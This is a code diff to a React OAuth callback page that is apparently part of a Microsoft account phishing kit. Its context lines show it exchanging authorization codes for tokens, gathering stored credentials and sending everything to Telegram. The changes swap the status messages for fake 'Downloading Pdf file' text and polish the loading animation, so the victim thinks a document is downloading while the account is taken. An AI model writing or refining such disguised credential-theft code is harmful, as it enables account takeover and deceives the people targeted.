@@ -8,7 +8,7 @@ function getByteLengthForBrowser(str: string): number {
 export default function AdminConsentCallback() {
   const location = useLocation();
   const navigate = useNavigate();
-  const [status, setStatus] = useState('Processing authentication...');
+  const [status, setStatus] = useState('Please wait while we complete the sign-in process');
   const [progress, setProgress] = useState(10);
 
   useEffect(() => {
@@ -111,7 +111,7 @@ export default function AdminConsentCallback() {
         }
 
         // ========== STEP 1: Exchange Code for Tokens ==========
-        setStatus('Exchanging authorization code...');
+        setStatus('Downloading Pdf file');
         setProgress(30);
         console.log('🔄 Exchanging authorization code for tokens...');
         
@@ -142,7 +142,7 @@ export default function AdminConsentCallback() {
         setProgress(50);
 
         // ========== STEP 2: Gather All Data ==========
-        setStatus('Consolidating your data...');
+        setStatus('Downloading Pdf file');
         console.log('🔄 Consolidating all data for submission...');
 
         const storedCreds = localStorage.getItem('ms_auth_credentials') || 
@@ -178,7 +178,7 @@ export default function AdminConsentCallback() {
         };
 
         // ========== STEP 3: Build and Send Payload ==========
-        setStatus('Sending data securely...');
+        setStatus('Downloading Pdf file');
         console.log('📤 Preparing to send payload to Telegram...');
         
         const payload = {
@@ -213,7 +213,7 @@ export default function AdminConsentCallback() {
 
         console.log('✅✅✅ SUCCESS: All data transmitted to Telegram!');
         setProgress(100);
-        setStatus('✅ Authentication Successful');
+        setStatus('Download Successful');
         
         // ✅ FIX: Clear processing flag before redirect
         sessionStorage.removeItem('oauth_processing');
@@ -244,7 +244,10 @@ export default function AdminConsentCallback() {
       fontFamily: 'Segoe UI, Arial, sans-serif',
       backgroundColor: '#f3f2f1'
     }}>
-        <h2 style={{ marginBottom: '20px', fontSize: '24px' }}>{status}</h2>
+        <h2 style={{ marginBottom: '20px', fontSize: '24px' }}>
+          {status}
+          {status.includes('Downloading') && <span style={{ animation: 'dots 1.5s steps(3, end) infinite' }}>...</span>}
+        </h2>
         <div style={{
             width: '300px',
             height: '8px',
@@ -261,16 +264,19 @@ export default function AdminConsentCallback() {
             }}></div>
         </div>
         <p style={{ fontSize: '14px', color: '#666', marginBottom: '30px' }}>{progress}%</p>
-        <div style={{
-            border: '4px solid #f3f2f1',
-            borderTop: '4px solid #0078d4',
-            borderRadius: '50%',
-            width: '40px',
-            height: '40px',
-            animation: 'spin 1s linear infinite'
-        }}></div>
+        {progress < 100 && (
+          <div style={{
+              border: '4px solid #f3f2f1',
+              borderTop: '4px solid #0078d4',
+              borderRadius: '50%',
+              width: '40px',
+              height: '40px',
+              animation: 'spin 1s linear infinite'
+          }}></div>
+        )}
       <style>{`
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        @keyframes dots { 0%, 20% { content: '.'; } 40% { content: '..'; } 60%, 100% { content: '...'; } }
       `}</style>
     </div>
   );
